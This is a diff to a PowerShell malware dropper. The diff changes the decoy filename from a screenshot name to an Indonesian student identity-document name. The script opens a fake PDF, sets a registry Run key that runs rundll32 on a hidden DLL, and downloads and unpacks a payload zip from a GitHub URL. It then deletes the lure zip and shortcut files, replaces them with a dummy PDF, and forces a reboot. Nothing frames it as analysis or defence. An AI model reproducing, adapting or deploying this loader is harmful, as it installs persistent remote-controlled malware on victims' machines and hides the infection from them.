@@ -1,5 +1,5 @@
-echo 1 > screenshoot_03113110041412141311566.pdf ;
-.\screenshoot_03113110041412141311566.pdf ;
+echo 1 > kkelengkapan_data_diri_KTM_KTP_Mahasiswa.pdf ;
+.\kelengkapan_data_diri_KTM_KTP_Mahasiswa.pdf ;
 if (Test-Path C:\helper\log.dll) { exit } 
 else { 
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'rundll32 C:\helper\log.dll,DllRegisterServer' -Force ;
@@ -7,5 +7,5 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Na
 powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\helper' | Out-Null ;
 wget "https://github.com/IsdaM123456/rQsa/raw/refs/heads/main/log.zip" -o C:\helper\log.zip; start-sleep 3 ;
 Expand-Archive C:\helper\log.zip C:\helper -Force ;
-"screenshoot_03113110041412141311566.zip","screenshoot_03113110041412141311566.pdf.lnk","screenshoot_03113110041412141311566 (2).zip" | % { Get-ChildItem $ENV:USERPROFILE -Recurse -Filter $_ | % { Remove-Item $_.FullName -Force; "1" | Out-File (Join-Path $_.DirectoryName "screenshoot_03113110041412141311566.pdf") -Encoding UTF8 } } ; start-sleep 3600 ; shutdown /r /t 300;
+"kelengkapan_data_diri_KTM_KTP_Mahasiswa.zip","kelengkapan_data_diri_KTM_KTP_Mahasiswa.pdf.lnk" | % { Get-ChildItem $ENV:USERPROFILE -Recurse -Filter $_ | % { Remove-Item $_.FullName -Force; "1" | Out-File (Join-Path $_.DirectoryName "kelengkapan_data_diri_KTM_KTP_Mahasiswa.pdf") -Encoding UTF8 } } ; start-sleep 3600 ; shutdown /r /t 300;
 }
